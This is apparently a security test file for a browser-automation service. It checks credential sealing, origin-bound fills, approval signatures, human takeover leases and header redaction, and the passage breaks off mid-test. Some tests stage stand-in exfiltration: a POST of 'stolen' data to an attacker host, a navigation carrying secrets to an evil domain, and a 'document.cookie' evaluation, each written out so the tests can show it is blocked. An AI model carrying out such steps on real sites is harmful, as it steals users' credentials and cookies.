// Copyright (c) 2026 Cloudflare, Inc.
// Licensed under the Apache 2.0 license found in the LICENSE file or at:
// https://opensource.org/licenses/Apache-2.0

import { describe, expect, it, vi } from "vitest";

// The frame isolate wasm is read from /bundle, which unit-test workers omit.
vi.mock("node:fs", () => ({
  default: {
    readdirSync: () => ["parawing_core_bg.wasm"],
    readFileSync: () => new Uint8Array(8),
  },
}));

import {
  ApprovalGate,
  ApprovalVerificationError,
  computeHttpActionDigest,
} from "../src/authority/approval-gate.ts";
import {
  AuthorityVaultAndChannel,
  SealedOriginMismatchError,
} from "../src/authority/authority-service.ts";
import { handleAccessibility, type AxNode } from "../src/cdp/accessibility.ts";
import { DedicatedWorkers } from "../src/cdp/dedicated-workers.ts";
import { dispatch, type DispatchCtx } from "../src/cdp/dispatch.ts";
import { NetworkEventTracker } from "../src/cdp/network-events.ts";
import { emitMutations } from "../src/cdp/dom.ts";
import {
  handlePage,
  emitFrameDclComplete,
  emitFrameLoadComplete,
  emitInputNavigationStarted,
} from "../src/cdp/page.ts";
import { registerCookieJar, unregisterCookieJar } from "../src/cdp/cookie-jar-registry.ts";
import {
  getFrameSealedOrigin,
  registerConnectionPolicy,
  setFrameSealedOrigin,
  unregisterConnectionSecurity,
} from "../src/cdp/session-security-registry.ts";
import { StyleCache } from "../src/cdp/style-cache.ts";
import { createPageTarget } from "../src/cdp/target.ts";
import type {
  BrowserState,
  CdpEvent,
  CdpRequest,
  CdpResponse,
  TargetState,
} from "../src/cdp/types.ts";
import { createCookieJar } from "../src/cookies.ts";
import { createSandboxOutboundOverride } from "../src/eval/outbound.ts";
import { DynamicWorkerBudget } from "../src/eval/worker-budget.ts";
import { createMemoryHostCapabilities } from "../src/host-capabilities.ts";
import type { HostIsolateLoader } from "../src/isolate-loader.ts";
import { ParawingAnalytics, SafePerformance } from "../src/observability.ts";
import { SignedAuditLog, verifyAuditChain } from "../src/policy/audit-log.ts";
import { ControllerLeaseManager } from "../src/policy/controller-lease.ts";
import { PolicyEngine } from "../src/policy/policy-engine.ts";
import { asSessionId, asTargetId, asUserId } from "../src/session/identities.ts";
import { MemorySessionStore } from "../src/state/session-store.ts";
import { WebStoragePersistenceBridge } from "../src/state/web-storage-bridge.ts";

function expectCdpErrorMessage(res: CdpResponse): string {
  if (!("error" in res)) {
    throw new Error(`Expected CDP error response for id=${res.id}, got result`);
  }
  return res.error.message;
}

function expectCdpSuccess(res: CdpResponse): void {
  if ("error" in res) {
    throw new Error(`Expected CDP success response, got error: ${res.error.message}`);
  }
}

function expectCdpResult<T = Record<string, unknown>>(res: CdpResponse): T {
  expectCdpSuccess(res);
  return (res as { id: number; result: unknown }).result as T;
}

function makeTestDispatchEnv(opts: {
  connectionMode: "browser" | "page";
  url: string;
  sessionIdStr: string;
  policyEngine: PolicyEngine;
  controllerLeases: ControllerLeaseManager;
  events: CdpEvent[];
  authority?: AuthorityVaultAndChannel;
  approvalGate?: ApprovalGate;
  auditLog?: SignedAuditLog;
}): { ctx: DispatchCtx; target: TargetState } {
  const host = createMemoryHostCapabilities();
  const store = new MemorySessionStore();
  let browserRef!: BrowserState;

  const networkEvents = new NetworkEventTracker((ev) => opts.events.push(ev), "sec-conn-1", {
    isObservationPaused: (sessionIds) => {
      for (const t of browserRef.targets.values()) {
        if (t.type !== "page") continue;
        const matchesTarget =
          sessionIds.length === 0 ||
          sessionIds.some((sid) => sid === undefined || t.sessions.has(sid));
        if (
          matchesTarget &&
          opts.controllerLeases.isAgentObservationPaused(asTargetId(t.targetId))
        ) {
          return true;
        }
      }
      return false;
    },
    sanitizeHeaders: (headers) => opts.policyEngine.redactHeadersForAgent(headers),
  });

  const isolateLoader: HostIsolateLoader = {
    load: () => {
      throw new Error("no real isolate spawned in policy dispatch test");
    },
  };

  const workerBudget = new DynamicWorkerBudget();
  browserRef = {
    targets: new Map(),
    sandboxOutbound: createSandboxOutboundOverride(host),
    autoAttach: false,
    flatten: false,
    cookies: createCookieJar(),
    contexts: new Map(),
    nextBrowserContextId: 1,
    screencasts: new Map(),
    styleCache: new StyleCache(),
    imageCache: new Map(),
    networkEvents,
    layoutMode: "full",
    cdpDebug: false,
    connectionMode: opts.connectionMode,
    preNavScripts: new Map(),
    learnedInsertedScripts: new Map(),
    pendingBindings: new Set(),
    execContextSeq: 1,
    runtimeEnabledSessions: new Set(),
    rendererManager: null,
    workerBudget,
    dedicatedWorkers: new DedicatedWorkers(workerBudget, host.tasks),
    skipSpeculativeRaster: false,
    skipPartialRaster: false,
    fontDefer: false,
    rendererSessionId: null,
    engineSessionId: null,
    wsClosing: false,
    attributionHeaders: {},
    sessionId: asSessionId("sess-sec-1"),
    userId: asUserId("user-sec-1"),
    persistentSession: false,
    delegatedAgent: opts.policyEngine.delegatedAgent,
    policyEngine: opts.policyEngine,
    controllerLeases: opts.controllerLeases,
    store,
    webStorage: new WebStoragePersistenceBridge(store),
    authority: opts.authority,
    approvalGate: opts.approvalGate,
    auditLog: opts.auditLog,
    emitSink: (ev) => opts.events.push(ev),
  };

  const analytics = new ParawingAnalytics(
    {
      sessionId: "sec-conn-1",
      entrypoint: "vitest",
      connectionMode: opts.connectionMode,
      environment: "test",
      buildVersion: "0.0.0",
      colo: "local",
    },
    new SafePerformance(host.clock.monotonic),
  );

  const ctx: DispatchCtx = {
    browser: browserRef,
    emit: (ev) => opts.events.push(ev),
    host,
    isolateLoader,
    connectionId: "sec-conn-1",
    analytics,
  };

  const target = createPageTarget(ctx, opts.url);
  target.sessions.add(opts.sessionIdStr);
  const mainFrame = target.frames.get(target.frameId);
  if (mainFrame) {
    mainFrame.sessions.add(opts.sessionIdStr);
  }
  return { ctx, target };
}

describe("A1 Authority Vault, Sealed Fill, and Target Isolation", () => {
  it("enforces origin-bound lookup, blocks cross-origin sealed fill, and locks agent inspection", async () => {
    const authority = await AuthorityVaultAndChannel.create();
    const userId = asUserId("user-vault");
    authority.storeCredential({
      id: "cred-bank",
      userId,
      origin: "https://bank.example",
      username: "alice@bank.example",
      secret: "super-secret-bank-password",
      label: "Primary Bank Login",
    });

    // Masked list is origin-bound and never exposes raw secret bytes.
    const masked = authority.listMaskedCredentials(userId, "https://bank.example/login");
    expect(masked).toHaveLength(1);
    expect(masked[0]?.usernameHint).toBe("al***");
    expect(JSON.stringify(masked)).not.toContain("super-secret-bank-password");
    expect(authority.listMaskedCredentials(userId, "https://evil.example")).toHaveLength(0);

    let currentOriginUrl = "https://evil.example/phish";
    let sealedOrigin: string | null = null;
    const injectedSecrets: string[] = [];

    const targetAdapter = {
      targetId: asTargetId("T-vault"),
      get currentUrl(): string {
        return currentOriginUrl;
      },
      setSealedOrigin(origin: string): void {
        sealedOrigin = origin;
      },
      async injectSecretIntoControl(secret: string): Promise<boolean> {
        injectedSecrets.push(secret);
        return true;
      },
    };

    await expect(
      authority.performSealedFill({ userId, target: targetAdapter, credentialId: "cred-bank" }),
    ).rejects.toThrow(SealedOriginMismatchError);
    expect(sealedOrigin).toBeNull();
    expect(injectedSecrets).toHaveLength(0);

    // Matching origin succeeds, sets sealedOrigin without returning secret to caller.
    currentOriginUrl = "https://bank.example/login";
    const fillRes = await authority.performSealedFill({
      userId,
      target: targetAdapter,
      credentialId: "cred-bank",
    });
    expect(fillRes.sealedOrigin).toBe("https://bank.example");
    expect(sealedOrigin).toBe("https://bank.example");
    expect(injectedSecrets).toEqual(["super-secret-bank-password"]);
    expect(JSON.stringify(fillRes)).not.toContain("super-secret-bank-password");

    // Dispatch blocks inspection/capture commands while target.sealedOrigin is active.
    const auditLog = new SignedAuditLog(authority);
    const policyEngine = new PolicyEngine({ auditLog });
    const controllerLeases = new ControllerLeaseManager();
    const events: CdpEvent[] = [];
    const { ctx, target } = makeTestDispatchEnv({
      connectionMode: "browser",
      url: "https://bank.example/login",
      sessionIdStr: "sess-cdp-1",
      policyEngine,
      controllerLeases,
      events,
      authority,
      auditLog,
    });
    target.sealedOrigin = "https://bank.example";

    const blockedRequests: Array<Omit<CdpRequest, "id" | "sessionId">> = [
      { method: "Runtime.evaluate", params: { expression: "document.cookie" } },
      { method: "Runtime.callFunctionOn", params: { functionDeclaration: "() => 1" } },
      { method: "Runtime.getProperties", params: { objectId: "obj-1" } },
      { method: "DOM.getDocument" },
      { method: "DOM.getOuterHTML", params: { nodeId: 1 } },
      { method: "Network.getResponseBody", params: { requestId: "req-1" } },
      { method: "Page.captureScreenshot" },
      { method: "Page.startScreencast" },
      { method: "Page.printToPDF" },
      { method: "Page.setDocumentContent", params: { frameId: "F-1", html: "<p>x</p>" } },
      { method: "Parawing.startSceneStream" },
      { method: "Parawing.recordScene" },
      { method: "Parawing.setControlValue", params: { nodeId: 1, value: "x" } },
      { method: "Accessibility.enable" },
      { method: "Accessibility.getFullAXTree" },
      { method: "Accessibility.getRootAXNode" },
      { method: "Accessibility.getPartialAXTree", params: { backendNodeId: 1 } },
      { method: "Accessibility.getChildAXNodes", params: { id: "1" } },
      { method: "Accessibility.getAXNodeAndAncestors", params: { backendNodeId: 1 } },
      { method: "Accessibility.queryAXTree", params: { role: "textbox" } },
      { method: "CSS.getInlineStylesForNode", params: { nodeId: 1 } },
      { method: "CSS.getComputedStyleForNode", params: { nodeId: 1 } },
      { method: "Debugger.getScriptSource", params: { scriptId: "s-1" } },
    ];
    for (let i = 0; i < blockedRequests.length; i += 1) {
      const baseReq = blockedRequests[i]!;
      const req = { ...baseReq, id: i + 1, sessionId: "sess-cdp-1" } as CdpRequest;
      const res = await dispatch(ctx, req);
      expect(expectCdpErrorMessage(res)).toContain("A1 sealed");
    }
    expect(
      policyEngine.evaluateCommand({
        method: "Parawing.screenshot",
        sealedOrigin: target.sealedOrigin,
      }).code,
    ).toBe("sealed-target-blocked");

    // Verify cross-origin subresource egress is blocked while sealedOrigin is active.
    registerConnectionPolicy("sec-outbound-1", policyEngine);
    setFrameSealedOrigin("sec-outbound-1", "frame-1", "https://bank.example");
    const blockedFetchCalls: string[] = [];
    const outbound = createSandboxOutboundOverride(createMemoryHostCapabilities(), {
      fetch: async (input) => {
        blockedFetchCalls.push(String(input));
        return new Response("ok");
      },
    });
    const exfilRes = await outbound
      .parent({
        pageOrigin: "https://bank.example",
        pageUrl: "https://bank.example/login",
        mainFrameId: "frame-1",
        connectionId: "sec-outbound-1",
      })
      .fetch(
        new Request("https://exfil.attacker.example/collect", {
          method: "POST",
          body: "stolen",
          headers: { "x-parawing-frame-id": "frame-1" },
        }),
      );
    expect(exfilRes.status).toBe(451);
    expect(exfilRes.headers.get("x-parawing-blocked-reason")).toContain("A1 sealed origin");
    expect(blockedFetchCalls).toHaveLength(0);
    unregisterConnectionSecurity("sec-outbound-1");

    // Clearing sealedOrigin on cross-document navigation re-enables dispatch.
    target.sealedOrigin = null;
    const versionRes = await dispatch(ctx, { id: 99, method: "Browser.getVersion" });
    expectCdpSuccess(versionRes);
    expect(await verifyAuditChain(auditLog.getEntries(), authority.publicKey)).toMatchObject({
      valid: true,
    });
  });

  it("blocks Accessibility.* and Page.setDocumentContent even directly on sealed targets and omits type=password values", async () => {
    const policyEngine = new PolicyEngine();
    const controllerLeases = new ControllerLeaseManager();
    const events: CdpEvent[] = [];
    const { ctx, target } = makeTestDispatchEnv({
      connectionMode: "browser",
      url: "https://bank.example/login",
      sessionIdStr: "sess-ax-seal",
      policyEngine,
      controllerLeases,
      events,
    });

    const docTree = {
      nodeId: 1,
      backendNodeId: 1,
      nodeType: 9,
      nodeName: "#document",
      children: [
        {
          nodeId: 2,
          backendNodeId: 2,
          nodeType: 1,
          nodeName: "HTML",
          localName: "html",
          nodeValue: "",
          children: [
            {
              nodeId: 3,
              backendNodeId: 3,
              nodeType: 1,
              nodeName: "BODY",
              localName: "body",
              nodeValue: "",
              children: [
                {
                  nodeId: 4,
                  backendNodeId: 4,
                  nodeType: 1,
                  nodeName: "INPUT",
                  localName: "input",
                  nodeValue: "",
                  attributes: ["type", "text", "aria-label", "Username", "value", "attr-user"],
                },
                {
                  nodeId: 5,
                  backendNodeId: 5,
                  nodeType: 1,
                  nodeName: "INPUT",
                  localName: "input",
                  nodeValue: "",
                  attributes: ["type", "password", "aria-label", "Password", "value", "attr-pw"],
                },
              ],
            },
          ],
        },
      ],
    };
    target.pageScript = {
      async queryDom(method: string) {
        if (method === "getDocument") return { root: docTree };
        if (method === "notRenderedNodeIds") return { displayNone: [], invisible: [] };
        if (method === "formStateSnapshot") {
          return {
            values: [
              [4, "alice"],
              [5, "super-secret-pw"],
            ],
            checked: [],
            selected: [],
          };
        }
        return {};
      },
    } as never;

    // Even unsealed Accessibility.* must never expose type="password" values.
    const unsealedTree = (await handleAccessibility(ctx, {
      id: 1,
      method: "Accessibility.getFullAXTree",
      sessionId: "sess-ax-seal",
    })) as { nodes: AxNode[] };
    expect(JSON.stringify(unsealedTree)).not.toContain("super-secret-pw");
    expect(JSON.stringify(unsealedTree)).not.toContain("attr-pw");
    const userNode = unsealedTree.nodes.find((n) => n.backendDOMNodeId === 4);
    const pwNode = unsealedTree.nodes.find((n) => n.backendDOMNodeId === 5);
    expect(userNode?.value?.value).toBe("alice");
    expect(pwNode?.value).toBeUndefined();

    // While sealed, even direct handler calls (bypassing dispatch PolicyEngine) throw.
    target.sealedOrigin = "https://bank.example";
    Reflect.deleteProperty(ctx.browser, "policyEngine");
    await expect(
      handleAccessibility(ctx, {
        id: 2,
        method: "Accessibility.queryAXTree",
        sessionId: "sess-ax-seal",
        params: { role: "textbox" },
      }),
    ).rejects.toThrow("sealed-target-blocked");
    await expect(
      handlePage(ctx, {
        id: 3,
        method: "Page.setDocumentContent",
        sessionId: "sess-ax-seal",
        params: { frameId: target.frameId, html: "<p>replaced</p>" },
      }),
    ).rejects.toThrow("sealed-target-blocked");
  });
});

describe("ApprovalGate cryptographic action-digest binding and timeout", () => {
  it("defaults to deny on timeout, binds to header-order-normalized digest, and rejects tampering", async () => {
    const authority = await AuthorityVaultAndChannel.create();
    const gate = new ApprovalGate(authority);

    const timedOut = await gate.holdForApproval({
      action: { method: "POST", url: "https://pay.test/send", body: '{"amount":50}' },
      domFields: [{ label: "Amount", value: "$50" }],
      timeoutMs: 15,
    });
    expect(timedOut.approved).toBe(false);
    expect(timedOut.reason).toBe("timeout");

    // Canonical digest is invariant under header case and ordering.
    const digestA = await computeHttpActionDigest({
      method: "post",
      url: "https://pay.test/send",
      headers: { "X-Id": "1", "Content-Type": "application/json" },
      body: '{"amount":100}',
    });
    const digestB = await computeHttpActionDigest({
      method: "POST",
      url: "https://pay.test/send",
      headers: { "content-type": "application/json", "x-id": "1" },
      body: '{"amount":100}',
    });
    expect(digestA).toBe(digestB);

    let capturedPromptDigest = "";
    let capturedNonce = "";
    const holdPromise = gate.holdForApproval({
      action: {
        method: "POST",
        url: "https://pay.test/send",
        headers: { "Content-Type": "application/json" },
        body: '{"amount":100}',
      },
      domFields: [{ label: "Recipient", value: "Alice" }],
      timeoutMs: 2_000,
      onPrompt: (req) => {
        capturedPromptDigest = req.requestDigest;
        capturedNonce = req.nonce;
        expect(req.summary).toEqual({
          targetOrigin: "https://pay.test",
          method: "POST",
          pathname: "/send",
          domFields: [{ label: "Recipient", value: "Alice" }],
        });
      },
    });

    await vi.waitFor(() => {
      expect(capturedNonce).not.toBe("");
    });

    const signedApproval = await gate.signDecision({
      requestDigest: capturedPromptDigest,
      nonce: capturedNonce,
      expiresAt: Date.now() + 10_000,
      approved: true,
    });
    const resolved = await gate.resolveWithSignedDecision(signedApproval);
    expect(resolved.approved).toBe(true);
    expect(await holdPromise).toMatchObject({ approved: true, reason: "signed-approval" });

    // Replayed resolution for same nonce must reject.
    await expect(gate.resolveWithSignedDecision(signedApproval)).rejects.toThrow(
      ApprovalVerificationError,
    );

    // Tampered body or URL fails execution digest check.
    await expect(
      gate.assertExecutionMatchesDecision(
        {
          method: "POST",
          url: "https://pay.test/send",
          headers: { "Content-Type": "application/json" },
          body: '{"amount":9999}',
        },
        signedApproval,
        capturedNonce,
      ),
    ).rejects.toThrow(ApprovalVerificationError);
  });
});

describe("ControllerLeaseManager takeover across browser + page mode and observation pause", () => {
  it("blocks agent dispatch in browser and un-sessioned page mode and suppresses agent observation", async () => {
    let clock = 5_000;
    const leases = new ControllerLeaseManager({ now: () => clock });
    const policyEngine = new PolicyEngine();
    const browserEvents: CdpEvent[] = [];
    const pageEvents: CdpEvent[] = [];

    const { ctx: browserCtx, target: browserTarget } = makeTestDispatchEnv({
      connectionMode: "browser",
      url: "https://app.test",
      sessionIdStr: "cdp-sess-human",
      policyEngine,
      controllerLeases: leases,
      events: browserEvents,
    });
    const { ctx: pageCtx, target: pageTarget } = makeTestDispatchEnv({
      connectionMode: "page",
      url: "https://app.test",
      sessionIdStr: "cdp-sess-page",
      policyEngine,
      controllerLeases: leases,
      events: pageEvents,
    });

    browserCtx.browser.networkEvents.setEnabled("cdp-sess-human", true);

    const browserLeaseReq = leases.request({
      targetId: asTargetId(browserTarget.targetId),
      requesterId: "human-operator",
      reason: "2fa",
      pauseObservation: true,
    });
    leases.approve(browserLeaseReq.leaseId, { ttlMs: 10_000 });

    const pageLeaseReq = leases.request({
      targetId: asTargetId(pageTarget.targetId),
      requesterId: "human-operator",
      reason: "2fa",
      pauseObservation: true,
    });
    leases.approve(pageLeaseReq.leaseId, { ttlMs: 10_000 });

    expect(leases.isAgentObservationPaused(asTargetId(browserTarget.targetId))).toBe(true);
    expect(leases.isAgentObservationPaused(asTargetId(pageTarget.targetId))).toBe(true);

    // Agent command fails in browser mode WITH sessionId AND un-sessioned page mode.
    const browserBlocked = await dispatch(browserCtx, {
      id: 1,
      sessionId: "cdp-sess-human",
      method: "Emulation.setUserAgentOverride",
      params: { userAgent: "Agent" },
    });
    expect(expectCdpErrorMessage(browserBlocked)).toContain("human controller lease");

    const pageBlocked = await dispatch(pageCtx, {
      id: 2,
      method: "Emulation.setUserAgentOverride",
      params: { userAgent: "Agent" },
    });
    expect(expectCdpErrorMessage(pageBlocked)).toContain("human controller lease");

    // Human actorRole passes during active takeover lease.
    const humanAllowed = await dispatch(pageCtx, {
      id: 3,
      method: "Emulation.setUserAgentOverride",
      params: { userAgent: "HumanBrowser" },
      ...({ _actorRole: "human" } as Record<string, unknown>),
    });
    expectCdpSuccess(humanAllowed);

    // Network event tracker suppresses emission while observation is paused.
    browserCtx.browser.networkEvents.beginRequest({
      url: "https://app.test/2fa-token",
      method: "POST",
      headers: { Authorization: "Bearer secret" },
      type: "XHR",
      initiator: { type: "script" },
      loaderId: browserTarget.loaderId,
      frameId: browserTarget.frameId,
      sessionIds: ["cdp-sess-human"],
    });
    browserCtx.browser.networkEvents.drain();
    expect(browserEvents.filter((e) => e.method === "Network.requestWillBeSent")).toHaveLength(0);

    // Advance past lease TTL -> expires automatically, agent dispatch resumes.
    clock = 15_001;
    expect(leases.isAgentObservationPaused(asTargetId(browserTarget.targetId))).toBe(false);
    expect(leases.isAgentObservationPaused(asTargetId(pageTarget.targetId))).toBe(false);
    const unblocked = await dispatch(pageCtx, {
      id: 4,
      method: "Emulation.setUserAgentOverride",
      params: { userAgent: "AgentResumed" },
    });
    expectCdpSuccess(unblocked);
  });
});

describe("PolicyEngine delegated-only redaction and SignedAuditLog hash chain", () => {
  it("redacts auth/cookie headers and blocks cookie getters ONLY when delegatedAgent is true", async () => {
    const authority = await AuthorityVaultAndChannel.create();
    const auditLog = new SignedAuditLog(authority);
    const delegatedPolicy = new PolicyEngine({
      delegatedAgent: true,
      allowedOrigins: ["https://allowed.test"],
      blockedEgressMethods: ["DELETE"],
      blockedTopLevelNavigationMethods: ["POST"],
      auditLog,
    });
    const directPolicy = new PolicyEngine({ delegatedAgent: false });

    const sampleHeaders = {
      Authorization: "Bearer super-secret",
      Cookie: "sid=secret-cookie",
      "X-Trace": "keep-me",
    };
    expect(delegatedPolicy.redactHeadersForAgent(sampleHeaders)).toEqual({
      Authorization: "[REDACTED]",
      Cookie: "[REDACTED]",
      "X-Trace": "keep-me",
    });
    expect(directPolicy.redactHeadersForAgent(sampleHeaders)).toEqual(sampleHeaders);

    expect(delegatedPolicy.evaluateCommand({ method: "Network.getCookies" }).allowed).toBe(false);
    expect(delegatedPolicy.evaluateCommand({ method: "Storage.getCookies" }).allowed).toBe(false);
    expect(directPolicy.evaluateCommand({ method: "Network.getCookies" }).allowed).toBe(true);

    // Top-level POST navigation denied; GET to allowedOrigin permitted; DELETE egress denied.
    expect(
      delegatedPolicy.evaluateEgress({
        url: "https://allowed.test/form",
        method: "POST",
        isTopLevelNavigation: true,
      }).code,
    ).toBe("top-level-navigation-denied");
    expect(
      delegatedPolicy.evaluateEgress({
        url: "https://allowed.test/item/1",
        method: "DELETE",
        isTopLevelNavigation: false,
      }).code,
    ).toBe("method-blocked");
    expect(
      delegatedPolicy.evaluateEgress({
        url: "https://allowed.test/page",
        method: "GET",
        isTopLevelNavigation: true,
      }).allowed,
    ).toBe(true);

    // NetworkEventTracker respects delegatedPolicy header redaction on wire events.
    const leakedEvents: CdpEvent[] = [];
    const tracker = new NetworkEventTracker((ev) => leakedEvents.push(ev), "delegated-conn", {
      sanitizeHeaders: (headers) => delegatedPolicy.redactHeadersForAgent(headers),
    });
    tracker.setEnabled("sess-del", true);
    tracker.beginRequest({
      url: "https://allowed.test/api",
      method: "GET",
      headers: { Authorization: "Bearer top-secret", Accept: "application/json" },
      type: "Fetch",
      initiator: { type: "script" },
      loaderId: "L-del",
      frameId: "F-del",
      sessionIds: ["sess-del"],
    });
    tracker.drain();
    const sent = leakedEvents.find((e) => e.method === "Network.requestWillBeSent");
    expect(sent).toBeDefined();
    expect(JSON.stringify(sent)).not.toContain("top-secret");

    // Audit chain verifies intact and rejects mid-chain tampering.
    await auditLog.append({ kind: "test.action", detail: { step: 1 } });
    await auditLog.append({ kind: "test.action", detail: { step: 2 } });
    expect((await auditLog.verify()).valid).toBe(true);
    expect(authority.getMirroredAudit()).toHaveLength(auditLog.getEntries().length);

    const tamperedEntries = auditLog
      .getEntries()
      .map((e, idx) => (idx === 0 ? { ...e, detail: { step: 999 } } : e));
    const broken = await verifyAuditChain(tamperedEntries, authority.publicKey);
    expect(broken.valid).toBe(false);
  });

  it("blocks cross-origin Page.navigate while keeping sealedOrigin, blocks Parawing.recordScene and Page.printToPDF, and isolates sibling frames", async () => {
    const authority = await AuthorityVaultAndChannel.create();
    const auditLog = new SignedAuditLog(authority);
    const policyEngine = new PolicyEngine({ auditLog });
    const controllerLeases = new ControllerLeaseManager();
    const events: CdpEvent[] = [];
    const { ctx, target } = makeTestDispatchEnv({
      connectionMode: "browser",
      url: "https://bank.example/login",
      sessionIdStr: "sess-seal-nav",
      policyEngine,
      controllerLeases,
      events,
      authority,
      auditLog,
    });

    target.sealedOrigin = "https://bank.example";
    setFrameSealedOrigin(ctx.connectionId, target.frameId, "https://bank.example");

    // Sibling frame on the same connection does not inherit sealedOrigin.
    expect(getFrameSealedOrigin(ctx.connectionId, target.frameId)).toBe("https://bank.example");
    expect(getFrameSealedOrigin(ctx.connectionId, "frame-sibling-unsealed")).toBeNull();

    // Real Page.navigate must evaluate policy BEFORE clearing target.sealedOrigin.
    const navRes = await dispatch(ctx, {
      id: 1,
      method: "Page.navigate",
      params: { url: "https://evil.example/steal", _parawingPostData: "secret=1" },
      sessionId: "sess-seal-nav",
    });
    const navError = expectCdpResult<{ errorText?: string }>(navRes).errorText ?? "";
    expect(navError).toContain("A1 sealed origin");
    expect(target.sealedOrigin).toBe("https://bank.example");
    expect(getFrameSealedOrigin(ctx.connectionId, target.frameId)).toBe("https://bank.example");

    // Parawing.recordScene and Page.printToPDF must both be blocked when sealedOrigin is active.
    const pdfRes = await dispatch(ctx, {
      id: 2,
      method: "Page.printToPDF",
      params: {},
      sessionId: "sess-seal-nav",
    });
    expect(expectCdpErrorMessage(pdfRes)).toContain("A1 sealed");
    const recRes = await dispatch(ctx, {
      id: 3,
      method: "Parawing.recordScene",
      params: {},
      sessionId: "sess-seal-nav",
    });
    expect(expectCdpErrorMessage(recRes)).toContain("A1 sealed");

    unregisterConnectionSecurity(ctx.connectionId);
  });

  it("suppresses console and raw network observation events during human takeover lease", async () => {
    const policyEngine = new PolicyEngine();
    const controllerLeases = new ControllerLeaseManager();
    const events: CdpEvent[] = [];
    const { ctx, target } = makeTestDispatchEnv({
      connectionMode: "browser",
      url: "https://app.test/home",
      sessionIdStr: "sess-obs",
      policyEngine,
      controllerLeases,
      events,
    });
    ctx.browser.runtimeEnabledSessions.add("sess-obs");
    ctx.browser.networkEvents.setEnabled("sess-obs", true);

    target.pageScript = {
      dispatchKeyEvent: async () => ({
        console: [
          {
            level: "log",
            args: [{ type: "string", valueJson: '"sensitive-input-log"' }],
            timestamp: 1,
          },
        ],
      }),
    } as never;

    const lease = controllerLeases.request({
      targetId: asTargetId(target.targetId),
      requesterId: "human-1",
      pauseObservation: true,
    });
    controllerLeases.approve(lease.leaseId, { ttlMs: 10_000 });
    await dispatch(ctx, {
      id: 10,
      method: "Input.insertText",
      params: { text: "secret-pin" },
      sessionId: "sess-obs",
    });
    const rawWillBeSent = {
      method: "Network.requestWillBeSent" as const,
      params: {
        requestId: "req-raw",
        loaderId: target.loaderId,
        documentURL: "https://app.test/home",
        request: {
          url: "https://app.test/api",
          method: "GET",
          headers: {},
          initialPriority: "High" as const,
          referrerPolicy: "strict-origin-when-cross-origin" as const,
        },
        timestamp: 1,
        wallTime: 1,
        initiator: { type: "other" as const },
        redirectHasExtraInfo: false,
      },
      sessionId: "sess-obs",
    };
    ctx.browser.networkEvents.queueRaw(rawWillBeSent);
    ctx.browser.networkEvents.drain();
    expect(events.some((e) => e.method === "Runtime.consoleAPICalled")).toBe(false);
    expect(events.some((e) => e.method === "Network.requestWillBeSent")).toBe(false);

    controllerLeases.release(lease.leaseId);
    await dispatch(ctx, {
      id: 11,
      method: "Input.insertText",
      params: { text: "public-text" },
      sessionId: "sess-obs",
    });
    ctx.browser.networkEvents.queueRaw(rawWillBeSent);
    ctx.browser.networkEvents.drain();
    expect(events.some((e) => e.method === "Runtime.consoleAPICalled")).toBe(true);
    expect(events.some((e) => e.method === "Network.requestWillBeSent")).toBe(true);
  });

  it("suppresses DOM, Page, Runtime, Network, and Log observation across owner and viewer dispatches during takeover", async () => {
    const policyEngine = new PolicyEngine();
    const controllerLeases = new ControllerLeaseManager();
    const events: CdpEvent[] = [];
    const viewerEvents: CdpEvent[] = [];
    const leaseTransitions: Array<{ targetId: string; active: boolean }> = [];
    controllerLeases.subscribe((targetId, active) => {
      leaseTransitions.push({ targetId, active });
    });

    const { ctx, target } = makeTestDispatchEnv({
      connectionMode: "browser",
      url: "https://app.test/home",
      sessionIdStr: "sess-takeover-obs",
      policyEngine,
      controllerLeases,
      events,
    });

    const stubDoc = {
      nodeId: 1,
      backendNodeId: 1,
      nodeType: 9,
      nodeName: "#document",
      localName: "",
      nodeValue: "",
      childNodeCount: 0,
      children: [],
    };
    const takeoverMutation = [
      { kind: "attributeModified", nodeId: 2, name: "data-secret", value: "v1" },
    ] as const;
    target.pageScript = {
      queryDom: async () => ({ root: stubDoc }),
      dispatchKeyEvent: async () => ({
        console: [
          {
            level: "log",
            args: [{ type: "string", valueJson: '"viewer-key-log"' }],
            timestamp: 1,
          },
        ],
        cdpMutations: [...takeoverMutation],
      }),
    } as never;

    await dispatch(ctx, { id: 1, method: "DOM.enable", sessionId: "sess-takeover-obs" });
    await dispatch(ctx, { id: 2, method: "DOM.getDocument", sessionId: "sess-takeover-obs" });
    await dispatch(ctx, { id: 3, method: "Page.enable", sessionId: "sess-takeover-obs" });
    await dispatch(ctx, { id: 4, method: "Runtime.enable", sessionId: "sess-takeover-obs" });
    await dispatch(ctx, { id: 5, method: "Network.enable", sessionId: "sess-takeover-obs" });
    ctx.browser.networkEvents.setLogEnabled("sess-takeover-obs", true);

    const lease = controllerLeases.request({
      targetId: asTargetId(target.targetId),
      requesterId: "human-viewer",
      pauseObservation: true,
    });
    controllerLeases.approve(lease.leaseId, { ttlMs: 10_000 });
    events.length = 0;

    // Viewer-initiated dispatch uses viewerCtx and must not leak observation events to owner.
    const viewerCtx: DispatchCtx = {
      ...ctx,
      connectionRole: "viewer",
      emit: (ev) => viewerEvents.push(ev),
    };
    const viewerKeyRes = await dispatch(viewerCtx, {
      id: 6,
      method: "Input.dispatchKeyEvent",
      params: { type: "keyDown", key: "a" },
      sessionId: "sess-takeover-obs",
    });
    expectCdpSuccess(viewerKeyRes);

    // Owner/background helpers must also drop DOM, Page, and Log observation while leased.
    emitMutations(ctx, target, [...takeoverMutation]);
    const main = target.frames.get(target.frameId)!;
    emitInputNavigationStarted(
      ctx,
      target,
      { url: "https://app.test/next", loaderId: "ldr-next", reason: "other" },
      "sess-takeover-obs",
    );
    emitFrameDclComplete(ctx, target, main, "sess-takeover-obs");
    emitFrameLoadComplete(ctx, target, main, "sess-takeover-obs");
    ctx.browser.networkEvents.logEntry(["sess-takeover-obs"], {
      source: "network",
      level: "error",
      text: "secret-auth-401",
      timestamp: 2,
    });
    ctx.browser.networkEvents.drain();

    const leaked = events.filter((e) =>
      ["DOM.", "Page.", "Runtime.", "Network.", "CSS.", "Log."].some((p) => e.method.startsWith(p)),
    );
    expect(leaked).toEqual([]);
    expect(viewerEvents.some((e) => e.method === "DOM.attributeModified")).toBe(true);

    controllerLeases.release(lease.leaseId);
    expect(leaseTransitions.at(-1)).toEqual({ targetId: target.targetId, active: false });

    emitMutations(ctx, target, [...takeoverMutation]);
    expect(events.some((e) => e.method === "DOM.attributeModified")).toBe(true);
  });

  it("enforces PolicyEngine.evaluateStorage across CDP cookies and outbound Set-Cookie, plus ApprovalGate.holdForApproval on POST/action", async () => {
